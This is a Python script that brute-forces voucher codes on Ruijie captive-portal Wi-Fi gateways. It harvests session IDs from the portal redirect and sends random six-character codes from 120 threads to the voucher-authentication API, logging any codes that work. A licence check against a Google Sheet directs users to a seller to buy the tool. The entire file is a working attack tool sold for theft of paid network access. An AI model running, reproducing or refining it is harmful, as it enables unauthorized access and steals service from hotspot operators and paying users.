import requests, random, string, time, os, threading, re
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# KEY APPROVAL SYSTEM (ADD-ON)
# ==============================
SHEET_ID = "1MKfd87jf2GB9rE1QWTU0BCTno9l3my2ewdfpUEMM9hI"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try: uid = os.geteuid()
    except: uid = 1000
    username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
    except: pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;36m╔══════════════════════════════════════════════════╗")
    print("║            VOUCHER SCANNER KEY SYSTEM            ║")
    print("╚══════════════════════════════════════════════════╝\033[00m")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        print(f"\n\033[1;32m[✓] KEY APPROVED! Unlocking Scanner...\033[00m")
        time.sleep(1.5)
        return True
    else:
        print(f"\n\033[1;31m[!] ACCESS DENIED\033[00m")
        print(f"\033[0;37mYour Key: {system_key}\033[00m")
        print(f"\033[1;33mContact @Kenobe21 to buy the tool.\033[00m")
        return False

# ==============================
# SCANNER CONFIG & GLOBALS
# ==============================
NUM_THREADS = 120             
SESSION_POOL_SIZE = 50       
PER_SESSION_MAX = 300        
SAVE_PATH = "/storage/emulated/0/zapya/valid_codes.txt"

session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()

# ==============================
# SCANNER FUNCTIONS
# ==============================
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r1 = s.get(test_url, allow_redirects=True, timeout=4)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=4)
            final_url = r2.url
            html_content = r1.text + r2.text
        else:
            html_content = r1.text
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', html_content)
            sid = sid_match.group(1) if sid_match else None
        return sid
    except: return None

def session_refiller():
    while True:
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid:
                    session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    char_range = string.ascii_letters + string.digits # Full Keys (A-Z, a-z, 0-9)
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    
    while True:
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue

            sid = slot.get('sessionId')
            code = ''.join(random.choices(char_range, k=6))
            CURRENT_CODE = code

            target_api = f"{DETECTED_BASE_URL}/api/auth/voucher/"
            r = thr_session.post(target_api, 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, 
                                 timeout=6)
            
            TOTAL_TRIED += 1
            res_text = r.text.lower()
            
            if "true" in res_text:
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        save_locally(code, sid)

            is_dead = any(m in res_text for m in ["timeout", "expired", "invalid"])
            if not is_dead and r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0:
                    session_pool.put(slot)
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f:
                f.write(f"{ts} | {code} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        print("="*55)
        print("   🚀 RUIJIE SCANNER (FULL KEY + APPROVAL) 🚀   ")
        print("="*55)
        print(f" [BASE URL] : {DETECTED_BASE_URL}")
        print(f" [THREADS]  : {NUM_THREADS} active")
        print(f" [SESSIONS] : {session_pool.qsize()} in pool")
        print("-"*55)
        print(f" [TOTAL TRIED] : {TOTAL_TRIED:,}")
        print(f" [FOUND HITS]  : {TOTAL_HITS}")
        print(f" [LIVE SPEED]  : {speed:.1f} codes/sec")
        print(f" [CURRENT CODE]: {CURRENT_CODE}")
        print("-"*55)
        print(" [SUCCESS CODES]:")
        for c in valid_codes[-5:]:
            print(f"  > ✅ {c}")
        print("-"*55)
        time.sleep(1)

# ==============================
# MAIN ENTRY
# ==============================
if __name__ == "__main__":
    if check_approval():
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[!] Stopped.")
    else:
        sys.exit(1)
